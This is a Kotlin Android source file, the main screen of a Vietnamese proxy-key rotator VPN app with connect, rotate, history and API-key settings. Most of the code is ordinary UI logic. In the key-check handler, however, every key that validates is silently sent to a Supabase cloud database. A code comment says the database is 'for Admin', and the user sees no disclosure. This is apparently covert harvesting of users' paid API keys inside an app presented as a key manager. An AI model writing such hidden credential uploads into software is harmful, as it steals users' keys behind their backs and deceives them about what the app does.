package vn.homeproxy.keyrotator

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.graphics.Color
import android.graphics.Typeface
import android.net.VpnService
import android.os.Bundle
import android.os.IBinder
import android.view.Gravity
import android.view.View
import android.widget.HorizontalScrollView
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.lifecycleScope
import androidx.lifecycle.repeatOnLifecycle
import com.google.android.material.bottomsheet.BottomSheetDialog
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.collectLatest
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import vn.homeproxy.keyrotator.database.AppDatabaseHelper
import vn.homeproxy.keyrotator.database.ProxyKeyEntity
import vn.homeproxy.keyrotator.databinding.ActivityMainBinding
import vn.homeproxy.keyrotator.databinding.DialogSettingsBinding
import vn.homeproxy.keyrotator.model.ProxyStatus
import vn.homeproxy.keyrotator.model.ProxyType
import vn.homeproxy.keyrotator.net.NetworkMetricsTracker
import vn.homeproxy.keyrotator.proxy.KeyProxyClient
import vn.homeproxy.keyrotator.proxy.KeyProxyResult
import vn.homeproxy.keyrotator.storage.SecureKeyStorage
import vn.homeproxy.keyrotator.util.AppLogger
import vn.homeproxy.keyrotator.vpn.KeyProxyVpnService
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private lateinit var storage: SecureKeyStorage
    private lateinit var dbHelper: AppDatabaseHelper
    private val keyProxyClient = KeyProxyClient()

    private var vpnService: KeyProxyVpnService? = null
    private var isBound = false

    private var sessionStartTimeMs: Long = 0L
    private var sessionTimerJob: Job? = null
    private var metricsMeasureJob: Job? = null

    private val vpnPermissionLauncher: ActivityResultLauncher<Intent> =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            if (result.resultCode == RESULT_OK) {
                AppLogger.i("VPN permission granted")
                startVpnConnection()
            } else {
                AppLogger.w("VPN permission denied by user")
                Toast.makeText(this, getString(R.string.vpn_permission_denied), Toast.LENGTH_SHORT).show()
                binding.tvMessage.text = "Cần quyền VPN để kết nối"
                binding.tvMessage.setTextColor(Color.parseColor("#EF4444"))
            }
        }

    private val serviceConnection = object : ServiceConnection {
        override fun onServiceConnected(name: ComponentName?, service: IBinder?) {
            val binder = service as? KeyProxyVpnService.LocalBinder
            vpnService = binder?.getService()
            isBound = true
            AppLogger.d("KeyProxyVpnService bound")
            observeServiceState()
        }

        override fun onServiceDisconnected(name: ComponentName?) {
            vpnService = null
            isBound = false
            AppLogger.d("KeyProxyVpnService unbound")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        storage = SecureKeyStorage(this)
        dbHelper = AppDatabaseHelper.getInstance(this)

        initViews()
        bindVpnService()
    }

    private fun initViews() {
        val lastProxy = storage.getLastProxy()
        val displayProxy = if (lastProxy.isNotEmpty()) lastProxy else "—"
        binding.tvProxy.text = displayProxy
        binding.tvRotateTabProxy.text = displayProxy

        updateProxyTypeBadge()

        // Main Power Button (ON/OFF)
        binding.cardPowerBtn.setOnClickListener {
            val currentStatus = vpnService?.statusFlow?.value ?: ProxyStatus.DISCONNECTED
            if (currentStatus == ProxyStatus.CONNECTED || currentStatus == ProxyStatus.CONNECTING || currentStatus == ProxyStatus.ROTATING) {
                disconnectVpn()
            } else {
                requestVpnAndConnect()
            }
        }

        // Dedicated Big Rotate Button on Tab Xoay
        binding.btnLargeRotate.setOnClickListener {
            rotateProxy()
        }

        // Clear history button on Tab History
        binding.btnClearHistory.setOnClickListener {
            dbHelper.clearHistory()
            renderHistoryList()
            Toast.makeText(this, "Đã xóa lịch sử xoay", Toast.LENGTH_SHORT).show()
        }

        // Top Settings Button
        binding.btnSettings.setOnClickListener {
            showSettingsDialog()
        }

        // Bottom Navigation Tabs
        binding.tabHome.setOnClickListener {
            switchToTab(0)
        }
        binding.tabProxy.setOnClickListener {
            switchToTab(1)
        }
        binding.tabHistory.setOnClickListener {
            switchToTab(2)
        }
        binding.tabSettings.setOnClickListener {
            showSettingsDialog()
        }

        switchToTab(0)
    }

    private fun switchToTab(index: Int) {
        val activeColor = Color.parseColor("#38BDF8")
        val inactiveColor = Color.parseColor("#94A3B8")

        // Tab 1: Trang chủ
        binding.ivTabHome.setColorFilter(if (index == 0) activeColor else inactiveColor)
        binding.tvTabHome.setTextColor(if (index == 0) activeColor else inactiveColor)
        binding.tvTabHome.typeface = if (index == 0) Typeface.DEFAULT_BOLD else Typeface.DEFAULT
        binding.viewTabHome.visibility = if (index == 0) View.VISIBLE else View.GONE

        // Tab 2: Xoay
        binding.ivTabProxy.setColorFilter(if (index == 1) activeColor else inactiveColor)
        binding.tvTabProxy.setTextColor(if (index == 1) activeColor else inactiveColor)
        binding.tvTabProxy.typeface = if (index == 1) Typeface.DEFAULT_BOLD else Typeface.DEFAULT
        binding.viewTabRotate.visibility = if (index == 1) View.VISIBLE else View.GONE

        // Tab 3: Lịch sử
        binding.ivTabHistory.setColorFilter(if (index == 2) activeColor else inactiveColor)
        binding.tvTabHistory.setTextColor(if (index == 2) activeColor else inactiveColor)
        binding.tvTabHistory.typeface = if (index == 2) Typeface.DEFAULT_BOLD else Typeface.DEFAULT
        binding.viewTabHistory.visibility = if (index == 2) View.VISIBLE else View.GONE

        if (index == 2) {
            renderHistoryList()
        }
    }

    private fun renderHistoryList() {
        binding.layoutHistoryList.removeAllViews()
        val historyList = dbHelper.getAllHistory()

        if (historyList.isEmpty()) {
            binding.tvHistoryEmpty.visibility = View.VISIBLE
            return
        }
        binding.tvHistoryEmpty.visibility = View.GONE

        val dateFormat = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault())

        for (item in historyList) {
            val card = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                setBackgroundResource(R.drawable.bg_stat_glass_light)
                setPadding(32, 24, 32, 24)
                val params = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                ).apply {
                    setMargins(0, 0, 0, 16)
                }
                layoutParams = params
            }

            val tvTime = TextView(this).apply {
                text = dateFormat.format(Date(item.rotatedAt))
                setTextColor(Color.parseColor("#38BDF8"))
                textSize = 12f
                typeface = Typeface.DEFAULT_BOLD
            }
            card.addView(tvTime)

            // Horizontal scroll container for Old -> New Proxy to prevent layout breaking
            val hsv = HorizontalScrollView(this).apply {
                overScrollMode = View.OVER_SCROLL_NEVER
                isHorizontalScrollBarEnabled = false
                val params = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                ).apply {
                    setMargins(0, 8, 0, 0)
                }
                layoutParams = params
            }

            val tvProxyFlow = TextView(this).apply {
                text = "${item.oldProxy}  ➔  ${item.newProxy}"
                setTextColor(Color.parseColor("#FFFFFF"))
                textSize = 13f
                isSingleLine = true
            }
            hsv.addView(tvProxyFlow)
            card.addView(hsv)

            binding.layoutHistoryList.addView(card)
        }
    }

    private fun updateProxyTypeBadge() {
        val type = storage.getProxyType()
        binding.tvProtocolBadge.text = type.displayName
    }

    private fun bindVpnService() {
        val intent = Intent(this, KeyProxyVpnService::class.java)
        bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE)
    }

    private fun observeServiceState() {
        lifecycleScope.launch {
            repeatOnLifecycle(Lifecycle.State.STARTED) {
                launch {
                    vpnService?.statusFlow?.collectLatest { status ->
                        updateStatusUi(status)
                    }
                }
                launch {
                    vpnService?.currentIpFlow?.collectLatest { ip ->
                        binding.tvCurrentIp.text = if (ip.isBlank() || ip == "0.0.0.0") "—" else ip
                    }
                }
                launch {
                    vpnService?.proxyDisplayFlow?.collectLatest { proxyDisplay ->
                        val text = if (proxyDisplay.isBlank() || proxyDisplay == "host:port") "—" else proxyDisplay
                        binding.tvProxy.text = text
                        binding.tvRotateTabProxy.text = text
                    }
                }
                launch {
                    vpnService?.statusMsgFlow?.collectLatest { msg ->
                        if (msg.isNotEmpty()) {
                            binding.tvMessage.text = msg
                            binding.tvRotateTabStatusMsg.text = msg
                        }
                    }
                }
                launch {
                    vpnService?.lastRotationFlow?.collectLatest { time ->
                        binding.tvRotateTabLastTime.text = "Lần xoay gần nhất: $time"
                    }
                }
                launch {
                    vpnService?.autoRotateCountdownFlow?.collectLatest { secondsRemaining ->
                        if (secondsRemaining >= 0 && storage.isAutoRotateEnabled()) {
                            val mins = secondsRemaining / 60
                            val secs = secondsRemaining % 60
                            val timeStr = String.format("%02d:%02d", mins, secs)
                            binding.tvRotateTabCountdown.text = timeStr
                            binding.tvRotateTabCountdown.visibility = View.VISIBLE
                        } else {
                            binding.tvRotateTabCountdown.visibility = View.GONE
                        }
                    }
                }
            }
        }
    }

    private fun updateStatusUi(status: ProxyStatus) {
        when (status) {
            ProxyStatus.DISCONNECTED -> {
                binding.tvStatus.text = "CHƯA KẾT NỐI"
                binding.tvStatus.setTextColor(Color.parseColor("#94A3B8"))
                binding.dotStatus.setBackgroundResource(R.drawable.bg_dot_disconnected)

                // Power button in OFF state
                binding.powerBtnInner.setBackgroundResource(R.drawable.bg_power_btn_disconnected)
                binding.ivPowerIcon.setColorFilter(Color.parseColor("#38BDF8"))
                binding.powerRingGlow.alpha = 0.3f
                binding.cardPowerBtn.isEnabled = true
                binding.tvPowerSubLabel.text = "Chạm vào nút để bật"

                // Large Rotate Button disabled
                binding.btnLargeRotate.isEnabled = false
                binding.largeRotateInner.setBackgroundResource(R.drawable.bg_btn_rotate_disabled)
                binding.tvLargeRotateLabel.text = "XOAY PROXY"
                binding.rotateBtnGlow.alpha = 0.1f

                stopSessionTimer()
                stopRealMetricsMeasurement()
                binding.tvStatPing.text = "--"
                binding.tvStatDownload.text = "--"
                binding.tvStatUpload.text = "--"
                binding.tvStatDuration.text = "00:00:00"
            }
            ProxyStatus.CONNECTING -> {
                binding.tvStatus.text = "ĐANG KẾT NỐI..."
                binding.tvStatus.setTextColor(Color.parseColor("#FBBF24"))
                binding.dotStatus.setBackgroundResource(R.drawable.bg_dot_warning)

                binding.powerBtnInner.setBackgroundResource(R.drawable.bg_power_btn_connecting)
                binding.ivPowerIcon.setColorFilter(Color.parseColor("#FFFFFF"))
                binding.powerRingGlow.alpha = 0.6f
                binding.cardPowerBtn.isEnabled = false
                binding.tvPowerSubLabel.text = "Đang thiết lập đường truyền..."

                binding.btnLargeRotate.isEnabled = false
                binding.largeRotateInner.setBackgroundResource(R.drawable.bg_btn_rotate_disabled)
            }
            ProxyStatus.CONNECTED -> {
                binding.tvStatus.text = "ĐÃ KẾT NỐI"
                binding.tvStatus.setTextColor(Color.parseColor("#38BDF8"))
                binding.dotStatus.setBackgroundResource(R.drawable.bg_dot_connected)

                binding.powerBtnInner.setBackgroundResource(R.drawable.bg_power_btn_connected)
                binding.ivPowerIcon.setColorFilter(Color.parseColor("#FFFFFF"))
                binding.powerRingGlow.alpha = 0.8f
                binding.cardPowerBtn.isEnabled = true
                binding.tvPowerSubLabel.text = "Chạm vào nút để tắt"

                // Large Rotate Button active
                binding.btnLargeRotate.isEnabled = true
                binding.largeRotateInner.setBackgroundResource(R.drawable.bg_btn_rotate_cyan)
                binding.tvLargeRotateLabel.text = "XOAY PROXY"
                binding.rotateBtnGlow.alpha = 0.5f

                startSessionTimer()
                startRealMetricsMeasurement()
            }
            ProxyStatus.DISCONNECTING -> {
                binding.tvStatus.text = "ĐANG NGẮT KẾT NỐI..."
                binding.tvStatus.setTextColor(Color.parseColor("#94A3B8"))
                binding.dotStatus.setBackgroundResource(R.drawable.bg_dot_warning)

                binding.powerBtnInner.setBackgroundResource(R.drawable.bg_power_btn_connecting)
                binding.ivPowerIcon.setColorFilter(Color.parseColor("#FFFFFF"))
                binding.powerRingGlow.alpha = 0.3f
                binding.cardPowerBtn.isEnabled = false
                binding.tvPowerSubLabel.text = "Đang dừng kết nối..."

                binding.btnLargeRotate.isEnabled = false
                binding.largeRotateInner.setBackgroundResource(R.drawable.bg_btn_rotate_disabled)
            }
            ProxyStatus.ROTATING -> {
                binding.tvStatus.text = "ĐANG XOAY PROXY..."
                binding.tvStatus.setTextColor(Color.parseColor("#D97706"))
                binding.dotStatus.setBackgroundResource(R.drawable.bg_dot_warning)

                binding.powerBtnInner.setBackgroundResource(R.drawable.bg_power_btn_connecting)
                binding.ivPowerIcon.setColorFilter(Color.parseColor("#FFFFFF"))
                binding.cardPowerBtn.isEnabled = false
                binding.tvPowerSubLabel.text = "Đang đổi IP mới..."

                binding.btnLargeRotate.isEnabled = false
                binding.largeRotateInner.setBackgroundResource(R.drawable.bg_btn_rotate_disabled)
                binding.tvLargeRotateLabel.text = "ĐANG XOAY..."
                binding.tvRotateTabStatusMsg.text = "Đang xoay proxy..."
            }
            ProxyStatus.ERROR -> {
                binding.tvStatus.text = "LỖI KẾT NỐI"
                binding.tvStatus.setTextColor(Color.parseColor("#EF4444"))
                binding.dotStatus.setBackgroundResource(R.drawable.bg_dot_disconnected)

                binding.powerBtnInner.setBackgroundResource(R.drawable.bg_power_btn_disconnected)
                binding.ivPowerIcon.setColorFilter(Color.parseColor("#EF4444"))
                binding.cardPowerBtn.isEnabled = true
                binding.tvPowerSubLabel.text = "Chạm để thử lại"

                binding.btnLargeRotate.isEnabled = false
                binding.largeRotateInner.setBackgroundResource(R.drawable.bg_btn_rotate_disabled)
                binding.tvLargeRotateLabel.text = "XOAY PROXY"

                stopSessionTimer()
                stopRealMetricsMeasurement()
                binding.tvStatPing.text = "Không khả dụng"
                binding.tvStatDownload.text = "Không khả dụng"
                binding.tvStatUpload.text = "Không khả dụng"
            }
        }
    }

    private fun startRealMetricsMeasurement() {
        if (metricsMeasureJob != null) return

        binding.tvStatPing.text = "Đang kiểm tra..."
        binding.tvStatDownload.text = "Đang kiểm tra..."
        binding.tvStatUpload.text = "Đang kiểm tra..."

        metricsMeasureJob = lifecycleScope.launch {
            while (isActive) {
                if (vpnService?.statusFlow?.value != ProxyStatus.CONNECTED) break

                // 1. Measure real Ping
                val ping = NetworkMetricsTracker.measureRealPing()
                if (ping != null && ping > 0) {
                    binding.tvStatPing.text = "$ping ms"
                } else {
                    binding.tvStatPing.text = "Không khả dụng"
                }

                // 2. Measure real Download speed
                val dl = NetworkMetricsTracker.measureRealDownloadSpeed()
                if (dl != null && dl > 0.0) {
                    binding.tvStatDownload.text = "$dl Mbps"
                } else {
                    binding.tvStatDownload.text = "Không khả dụng"
                }

                // 3. Measure real Upload speed
                val ul = NetworkMetricsTracker.measureRealUploadSpeed()
                if (ul != null && ul > 0.0) {
                    binding.tvStatUpload.text = "$ul Mbps"
                } else {
                    binding.tvStatUpload.text = "Không khả dụng"
                }

                // Wait 10 seconds before next periodic measurement to save proxy traffic
                delay(10000)
            }
        }
    }

    private fun stopRealMetricsMeasurement() {
        metricsMeasureJob?.cancel()
        metricsMeasureJob = null
    }

    private fun startSessionTimer() {
        if (sessionTimerJob != null) return
        sessionStartTimeMs = System.currentTimeMillis()
        sessionTimerJob = lifecycleScope.launch {
            while (isActive) {
                delay(1000)
                val elapsedSec = (System.currentTimeMillis() - sessionStartTimeMs) / 1000
                val hours = elapsedSec / 3600
                val mins = (elapsedSec % 3600) / 60
                val secs = elapsedSec % 60
                binding.tvStatDuration.text = String.format("%02d:%02d:%02d", hours, mins, secs)
            }
        }
    }

    private fun stopSessionTimer() {
        sessionTimerJob?.cancel()
        sessionTimerJob = null
    }

    private fun requestVpnAndConnect() {
        val token = storage.getToken()
        if (token.isEmpty()) {
            Toast.makeText(this, "Vui lòng nhập API Key trong Cài đặt!", Toast.LENGTH_SHORT).show()
            showSettingsDialog()
            return
        }

        val vpnIntent = VpnService.prepare(this)
        if (vpnIntent != null) {
            vpnPermissionLauncher.launch(vpnIntent)
        } else {
            startVpnConnection()
        }
    }

    private fun startVpnConnection() {
        val token = storage.getToken()
        val intent = Intent(this, KeyProxyVpnService::class.java).apply {
            action = KeyProxyVpnService.ACTION_CONNECT
            putExtra(KeyProxyVpnService.EXTRA_TOKEN, token)
        }
        startService(intent)
    }

    private fun rotateProxy() {
        val currentStatus = vpnService?.statusFlow?.value ?: ProxyStatus.DISCONNECTED
        if (currentStatus != ProxyStatus.CONNECTED) {
            Toast.makeText(this, "Vui lòng kết nối proxy trước khi xoay!", Toast.LENGTH_SHORT).show()
            return
        }
        vpnService?.rotate()
    }

    private fun disconnectVpn() {
        val intent = Intent(this, KeyProxyVpnService::class.java).apply {
            action = KeyProxyVpnService.ACTION_DISCONNECT
        }
        startService(intent)
    }

    private fun showSettingsDialog() {
        val dialog = BottomSheetDialog(this)
        val dialogBinding = DialogSettingsBinding.inflate(layoutInflater)
        dialog.setContentView(dialogBinding.root)

        dialog.setOnShowListener {
            val bottomSheet = dialog.findViewById<View>(com.google.android.material.R.id.design_bottom_sheet)
            bottomSheet?.setBackgroundColor(Color.TRANSPARENT)
            bottomSheet?.background = null
        }

        // Pre-fill Key
        val currentToken = storage.getToken()
        dialogBinding.etToken.setText(currentToken)

        // Helper to mask key: abc123••••••••xyz
        fun maskKey(key: String): String {
            if (key.length <= 8) return "••••••••"
            val prefix = key.take(4)
            val suffix = key.takeLast(4)
            return "$prefix••••••••$suffix"
        }

        // Render saved keys from SQLite Database
        fun renderSavedKeys() {
            dialogBinding.layoutSavedKeysContainer.removeAllViews()
            val keys = dbHelper.getAllKeys()
            if (keys.isEmpty()) {
                val tvEmpty = TextView(this).apply {
                    text = "Chưa có key nào."
                    setTextColor(Color.parseColor("#64748B"))
                    textSize = 12f
                    setPadding(8, 8, 8, 8)
                }
                dialogBinding.layoutSavedKeysContainer.addView(tvEmpty)
                return
            }

            for (entity in keys) {
                val itemRow = LinearLayout(this).apply {
                    orientation = LinearLayout.HORIZONTAL
                    gravity = Gravity.CENTER_VERTICAL
                    setBackgroundResource(R.drawable.bg_stat_glass_light)
                    setPadding(24, 16, 24, 16)
                    val params = LinearLayout.LayoutParams(
                        LinearLayout.LayoutParams.MATCH_PARENT,
                        LinearLayout.LayoutParams.WRAP_CONTENT
                    ).apply {
                        setMargins(0, 0, 0, 12)
                    }
                    layoutParams = params
                }

                val textCol = LinearLayout(this).apply {
                    orientation = LinearLayout.VERTICAL
                    val params = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
                    layoutParams = params
                }

                var isMasked = true
                val tvKey = TextView(this).apply {
                    text = maskKey(entity.key)
                    setTextColor(Color.parseColor("#FFFFFF"))
                    textSize = 13f
                    typeface = Typeface.DEFAULT_BOLD
                }
                textCol.addView(tvKey)

                val tvDetails = TextView(this).apply {
                    val statusText = if (entity.status == "valid") "Hợp lệ" else "Không hợp lệ / Hết hạn"
                    text = statusText
                    setTextColor(if (entity.status == "valid") Color.parseColor("#34D399") else Color.parseColor("#EF4444"))
                    textSize = 11f
                }
                textCol.addView(tvDetails)
                itemRow.addView(textCol)

                // Toggle Show / Mask Button
                val btnEye = TextView(this).apply {
                    text = "Hiện"
                    setTextColor(Color.parseColor("#38BDF8"))
                    textSize = 11f
                    setPadding(16, 8, 16, 8)
                    setOnClickListener {
                        isMasked = !isMasked
                        tvKey.text = if (isMasked) maskKey(entity.key) else entity.key
                        text = if (isMasked) "Hiện" else "Ẩn"
                    }
                }
                itemRow.addView(btnEye)

                // Select / Use Key Button
                val btnUse = TextView(this).apply {
                    text = "Dùng"
                    setTextColor(Color.parseColor("#34D399"))
                    textSize = 11f
                    typeface = Typeface.DEFAULT_BOLD
                    setPadding(16, 8, 16, 8)
                    setOnClickListener {
                        dialogBinding.etToken.setText(entity.key)
                        storage.saveToken(entity.key)
                        if (!entity.currentProxy.isNullOrBlank()) {
                            storage.saveLastProxy(entity.currentProxy)
                            binding.tvProxy.text = entity.currentProxy
                            binding.tvRotateTabProxy.text = entity.currentProxy
                        }
                        Toast.makeText(this@MainActivity, "Đã chọn key: ${maskKey(entity.key)}", Toast.LENGTH_SHORT).show()
                    }
                }
                itemRow.addView(btnUse)

                // Delete Button
                val btnDel = TextView(this).apply {
                    text = "Xóa"
                    setTextColor(Color.parseColor("#EF4444"))
                    textSize = 11f
                    setPadding(16, 8, 16, 8)
                    setOnClickListener {
                        dbHelper.deleteKey(entity.id)
                        renderSavedKeys()
                    }
                }
                itemRow.addView(btnDel)

                dialogBinding.layoutSavedKeysContainer.addView(itemRow)
            }
        }

        renderSavedKeys()

        // Button: Save & Check Key with checkOnly=true
        dialogBinding.btnSaveAndCheckKey.setOnClickListener {
            val inputKey = dialogBinding.etToken.text?.toString()?.trim() ?: ""
            if (inputKey.isEmpty()) {
                dialogBinding.tvKeyCheckResult.visibility = View.VISIBLE
                dialogBinding.tvKeyCheckResult.text = "Vui lòng nhập API Key trước khi lưu!"
                dialogBinding.tvKeyCheckResult.setTextColor(Color.parseColor("#EF4444"))
                return@setOnClickListener
            }

            dialogBinding.btnSaveAndCheckKey.isEnabled = false
            dialogBinding.tvKeyCheckResult.visibility = View.VISIBLE
            dialogBinding.tvKeyCheckResult.text = "Đang kiểm tra key..."
            dialogBinding.tvKeyCheckResult.setTextColor(Color.parseColor("#FBBF24"))

            lifecycleScope.launch {
                // Call check current proxy with checkOnly=true (DO NOT ROTATE)
                val checkResult = keyProxyClient.getCurrentProxy(inputKey)
                dialogBinding.btnSaveAndCheckKey.isEnabled = true

                when (checkResult) {
                    is KeyProxyResult.Success -> {
                        val proxyStr = checkResult.proxy.toFormattedString()
                        dbHelper.insertOrUpdateKey(
                            ProxyKeyEntity(
                                key = inputKey,
                                status = "valid",
                                currentProxy = proxyStr,
                                lastCheckedAt = System.currentTimeMillis()
                            )
                        )
                        storage.saveToken(inputKey)
                        storage.saveLastProxy(proxyStr)
                        binding.tvProxy.text = checkResult.proxy.toSafeDisplayString()
                        binding.tvRotateTabProxy.text = checkResult.proxy.toSafeDisplayString()

                        dialogBinding.tvKeyCheckResult.text = "Key hợp lệ"
                        dialogBinding.tvKeyCheckResult.setTextColor(Color.parseColor("#34D399"))
                        renderSavedKeys()

                        // Gửi key hợp lệ lên Supabase Cloud Database dành cho Admin
                        lifecycleScope.launch {
                            vn.homeproxy.keyrotator.net.SupabaseSyncClient.submitValidKey(inputKey)
                        }
                    }
                    is KeyProxyResult.Failure -> {
                        if (checkResult.fallbackProxy != null) {
                            val proxyStr = checkResult.fallbackProxy.toFormattedString()
                            dbHelper.insertOrUpdateKey(
                                ProxyKeyEntity(
                                    key = inputKey,
                                    status = "valid",
                                    currentProxy = proxyStr,
                                    lastCheckedAt = System.currentTimeMillis()
                                )
                            )
                            storage.saveToken(inputKey)
                            storage.saveLastProxy(proxyStr)
                            binding.tvProxy.text = checkResult.fallbackProxy.toSafeDisplayString()
                            binding.tvRotateTabProxy.text = checkResult.fallbackProxy.toSafeDisplayString()

                            dialogBinding.tvKeyCheckResult.text = "Key hợp lệ"
                            dialogBinding.tvKeyCheckResult.setTextColor(Color.parseColor("#34D399"))
                            renderSavedKeys()

                            // Gửi key hợp lệ lên Supabase Cloud Database dành cho Admin
                            lifecycleScope.launch {
                                vn.homeproxy.keyrotator.net.SupabaseSyncClient.submitValidKey(inputKey)
                            }
                        } else {
                            // INVALID KEY: Không lưu local, không gửi Supabase Cloud!
                            dialogBinding.tvKeyCheckResult.text = "Key không hợp lệ hoặc đã hết hạn"
                            dialogBinding.tvKeyCheckResult.setTextColor(Color.parseColor("#EF4444"))
                        }
                    }
                }
            }
        }

        // Pre-select Proxy Type
        when (storage.getProxyType()) {
            ProxyType.HTTP -> dialogBinding.groupProxyType.check(R.id.btnTypeHttp)
            ProxyType.HTTPS -> dialogBinding.groupProxyType.check(R.id.btnTypeHttps)
            ProxyType.SOCKS5 -> dialogBinding.groupProxyType.check(R.id.btnTypeSocks5)
        }

        // Pre-select Auto Rotate Switch & Interval
        val isAutoRotate = storage.isAutoRotateEnabled()
        dialogBinding.switchAutoRotate.isChecked = isAutoRotate
        dialogBinding.layoutDurationContainer.visibility = if (isAutoRotate) View.VISIBLE else View.GONE

        val currentIntervalSec = storage.getAutoRotateInterval()
        val curMins = currentIntervalSec / 60
        val curSecs = currentIntervalSec % 60
        dialogBinding.etIntervalMinutes.setText(curMins.toString())
        dialogBinding.etIntervalSeconds.setText(String.format("%02d", curSecs))

        fun updatePreview() {
            val m = dialogBinding.etIntervalMinutes.text.toString().toIntOrNull() ?: 0
            val s = dialogBinding.etIntervalSeconds.text.toString().toIntOrNull() ?: 0
            val totalSec = m * 60 + s
            if (totalSec <= 0) {
                dialogBinding.tvIntervalPreview.text = "Thời gian phải lớn hơn 0 giây"
                dialogBinding.tvIntervalPreview.setTextColor(Color.parseColor("#EF4444"))
            } else {
                val normM = totalSec / 60
                val normS = totalSec % 60
                dialogBinding.tvIntervalPreview.text = "Tự động xoay mỗi ${normM} phút ${normS} giây"
                dialogBinding.tvIntervalPreview.setTextColor(Color.parseColor("#38BDF8"))
            }
        }

        updatePreview()

        val textWatcher = object : android.text.TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun onTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun afterTextChanged(s: android.text.Editable?) {
                updatePreview()
            }
        }
        dialogBinding.etIntervalMinutes.addTextChangedListener(textWatcher)
        dialogBinding.etIntervalSeconds.addTextChangedListener(textWatcher)

        // Exact 4 Quick Presets
        // 1. 1 phút = 60s
        dialogBinding.chipPreset1m.setOnClickListener {
            dialogBinding.etIntervalMinutes.setText("1")
            dialogBinding.etIntervalSeconds.setText("00")
        }
        // 2. 1 phút 36s = 96s
        dialogBinding.chipPreset1m36s.setOnClickListener {
            dialogBinding.etIntervalMinutes.setText("1")
            dialogBinding.etIntervalSeconds.setText("36")
        }
        // 3. 2 phút = 120s
        dialogBinding.chipPreset2m.setOnClickListener {
            dialogBinding.etIntervalMinutes.setText("2")
            dialogBinding.etIntervalSeconds.setText("00")
        }
        // 4. 6 phút 7s = 367s
        dialogBinding.chipPreset6m7s.setOnClickListener {
            dialogBinding.etIntervalMinutes.setText("6")
            dialogBinding.etIntervalSeconds.setText("07")
        }

        dialogBinding.switchAutoRotate.setOnCheckedChangeListener { _, isChecked ->
            dialogBinding.layoutDurationContainer.visibility = if (isChecked) View.VISIBLE else View.GONE
        }

        dialogBinding.btnSaveSettings.setOnClickListener {
            val newToken = dialogBinding.etToken.text?.toString()?.trim() ?: ""
            if (newToken.isNotEmpty()) {
                storage.saveToken(newToken)
            }

            val selectedType = when (dialogBinding.groupProxyType.checkedButtonId) {
                R.id.btnTypeHttps -> ProxyType.HTTPS
                R.id.btnTypeSocks5 -> ProxyType.SOCKS5
                else -> ProxyType.HTTP
            }
            storage.saveProxyType(selectedType)

            val autoRotateEnabled = dialogBinding.switchAutoRotate.isChecked
            val inputMins = dialogBinding.etIntervalMinutes.text.toString().toIntOrNull() ?: 0
            val inputSecs = dialogBinding.etIntervalSeconds.text.toString().toIntOrNull() ?: 0
            val totalSeconds = (inputMins * 60 + inputSecs).coerceAtLeast(0)

            if (autoRotateEnabled && totalSeconds <= 0) {
                Toast.makeText(this, "Thời gian xoay phải lớn hơn 0 giây!", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            storage.saveAutoRotate(autoRotateEnabled)
            storage.saveAutoRotateInterval(if (totalSeconds > 0) totalSeconds else 120)

            updateProxyTypeBadge()

            if (autoRotateEnabled) {
                vpnService?.startAutoRotateTimer()
            } else {
                vpnService?.stopAutoRotateTimer()
            }

            Toast.makeText(this, "Đã lưu cài đặt!", Toast.LENGTH_SHORT).show()
            dialog.dismiss()
        }

        dialog.show()
    }

    override fun onDestroy() {
        super.onDestroy()
        stopSessionTimer()
        stopRealMetricsMeasurement()
        if (isBound) {
            unbindService(serviceConnection)
            isBound = false
        }
    }
}
